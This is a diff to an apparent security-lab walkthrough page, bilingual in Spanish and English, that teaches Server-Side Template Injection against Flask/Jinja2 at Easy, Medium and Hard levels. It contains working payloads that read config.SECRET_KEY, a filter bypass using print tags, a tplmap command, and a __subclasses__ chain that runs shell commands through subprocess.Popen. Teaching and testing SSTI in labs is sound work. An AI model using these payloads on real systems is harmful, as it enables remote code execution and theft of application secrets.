@@ -32,19 +32,20 @@
     <h3>¿Qué es SSTI?</h3>
     <ol>
       <li>Flask usa Jinja2 como motor de plantillas. Si el input del usuario se pasa directamente a <code>render_template_string()</code>, un atacante puede inyectar expresiones Jinja2.</li>
-      <li>Prueba con una expresión matemática para confirmar la vulnerabilidad:</li>
-    </ol>
-    <pre>{{ "{{" }} 7*7 {{ "}}" }}          → 49
+      <li><strong>Easy:</strong> Sin filtro. Prueba con una expresión matemática para confirmar:
+        <pre>{{ "{{" }} 7*7 {{ "}}" }}          → 49
 {{ "{{" }} config {{ "}}" }}       → configuración Flask
-{{ "{{" }} config.SECRET_KEY {{ "}}" }}</pre>
-    <ol start="3">
-      <li>Escala al RCE (Remote Code Execution) recorriendo la cadena de objetos Python:</li>
-    </ol>
-    <pre>{{ "{{" }} ''.__class__.__mro__[1].__subclasses__() {{ "}}" }}
-{{ "{{" }} ''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate() {{ "}}" }}</pre>
-    <ol start="4">
+{{ "{{" }} config.SECRET_KEY {{ "}}" }}</pre></li>
+      <li><strong>Medium:</strong> Bloquea <code>{{ "{{" }} {{ "}}" }}</code> pero permite <code>{%25 %25}</code>. Bypass:
+        <pre>{%25 print 7*7 %25}                    → 49
+{%25 print config %25}                 → configuración Flask
+{%25 print config.SECRET_KEY %25}</pre></li>
+      <li><strong>Hard:</strong> Bloquea <code>{{ "{{" }}</code>, <code>{%25</code>, <code>__class__</code>, <code>__mro__</code>, <code>__subclasses__</code>, <code>popen</code>, etc. Usa herramientas automatizadas:
+        <pre>tplmap -u "http://TARGET_IP/ssti" --data "template=*" --level 5</pre></li>
+      <li>Escala al RCE (Easy) recorriendo la cadena de objetos Python:
+        <pre>{{ "{{" }} ''.__class__.__mro__[1].__subclasses__() {{ "}}" }}
+{{ "{{" }} ''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate() {{ "}}" }}</pre></li>
       <li>Busca el índice de <code>subprocess.Popen</code> en la lista de subclases e inyecta comandos arbitrarios.</li>
-      <li>Con <strong>tplmap</strong>: <code>tplmap -u "http://localhost:5000/ssti" --data "template=*"</code></li>
     </ol>
     <h3>Herramientas</h3>
     <div><span class="tools-badge">tplmap</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span></div>
@@ -53,19 +54,20 @@
     <h3>What is SSTI?</h3>
     <ol>
       <li>Flask uses Jinja2 as a template engine. If user input is passed directly to <code>render_template_string()</code>, an attacker can inject Jinja2 expressions.</li>
-      <li>Test with a math expression to confirm the vulnerability:</li>
-    </ol>
-    <pre>{{ "{{" }} 7*7 {{ "}}" }}          → 49
+      <li><strong>Easy:</strong> No filter. Test with a math expression to confirm:
+        <pre>{{ "{{" }} 7*7 {{ "}}" }}          → 49
 {{ "{{" }} config {{ "}}" }}       → Flask config object
-{{ "{{" }} config.SECRET_KEY {{ "}}" }}</pre>
-    <ol start="3">
-      <li>Escalate to RCE by traversing Python's object hierarchy:</li>
-    </ol>
-    <pre>{{ "{{" }} ''.__class__.__mro__[1].__subclasses__() {{ "}}" }}
-{{ "{{" }} ''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate() {{ "}}" }}</pre>
-    <ol start="4">
+{{ "{{" }} config.SECRET_KEY {{ "}}" }}</pre></li>
+      <li><strong>Medium:</strong> Blocks <code>{{ "{{" }} {{ "}}" }}</code> but allows <code>{%25 %25}</code>. Bypass:
+        <pre>{%25 print 7*7 %25}                    → 49
+{%25 print config %25}                 → Flask config object
+{%25 print config.SECRET_KEY %25}</pre></li>
+      <li><strong>Hard:</strong> Blocks <code>{{ "{{" }}</code>, <code>{%25</code>, <code>__class__</code>, <code>__mro__</code>, <code>__subclasses__</code>, <code>popen</code>, etc. Use automated tools:
+        <pre>tplmap -u "http://TARGET_IP/ssti" --data "template=*" --level 5</pre></li>
+      <li>Escalate to RCE (Easy) by traversing Python's object hierarchy:
+        <pre>{{ "{{" }} ''.__class__.__mro__[1].__subclasses__() {{ "}}" }}
+{{ "{{" }} ''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate() {{ "}}" }}</pre></li>
       <li>Find the index of <code>subprocess.Popen</code> in the subclasses list and inject arbitrary commands.</li>
-      <li>With <strong>tplmap</strong>: <code>tplmap -u "http://localhost:5000/ssti" --data "template=*"</code></li>
     </ol>
     <h3>Tools</h3>
     <div><span class="tools-badge">tplmap</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span></div>
